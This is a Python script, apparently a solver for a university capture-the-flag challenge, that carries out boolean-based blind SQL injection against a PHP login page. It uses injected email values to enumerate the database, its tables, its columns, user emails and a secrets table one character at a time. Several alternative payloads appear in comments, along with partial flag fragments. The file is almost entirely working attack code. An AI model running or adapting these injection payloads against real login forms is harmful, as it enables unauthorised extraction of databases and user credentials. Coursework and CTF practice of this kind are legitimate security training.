import requests

url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"

chs= "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{,}?!-@#$%^&* \"')(=+./"
#chs= " ,abcdefghijklmnopqrstuvwxyz"
#chs = ",0123456789"


cookie = {
    "CHALBROKER_USER_ID":"netid",
    "PHPSESSID":"phpsessid"
}

#payload = {
#    "email": "' or (select count(table_name) from information_schema.tables where table_schema=database())=2--",
#    "password": "'",
#}
#payload = {
#        "email": "-1' or substring(database()," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
#        "password": "123"
#}
#payload = {
#        "email": "-1' or substring((select group_concat(table_name) from information_schema.tables where table_schema=\"logmein\")," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
#        "password": "123"
#}
#payload = {
#        "email": "-1' or substring((select group_concat(column_name) from information_schema.columns where table_name=\"users\")," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
#        "password": "123"
#}
#payload = {
#        "email": "-1' or substring((select group_concat(email) from users," + str(count) + ",1)=\"" + str(chs[pointer]) + "\" -- ",
#        "password": "123"
#}
count = 34
pointer = 0
res = ""

while True:
    print("trying:", chs[pointer])
    print("count:", count)
    payload = {
        "email": "123' or binary substring((select group_concat(value) from secrets)," + str(count) + ",1)=\"" + str(chs[pointer]) + "\" -- ",
        "password": "123"
    }
    req = requests.post(url, cookies=cookie, data=payload)
    if "The flag is elsewhere this time" in req.text:
        res += chs[pointer]
        pointer = 0
        count += 1
        
    else:
        pointer += 1
    print("res:", res)
    #print(req.text)
    #break
    
print(res)

#print("The flag is elsewhere" in req.text)
#print(req.text)
#flag{1_r3ally
#d_id3a
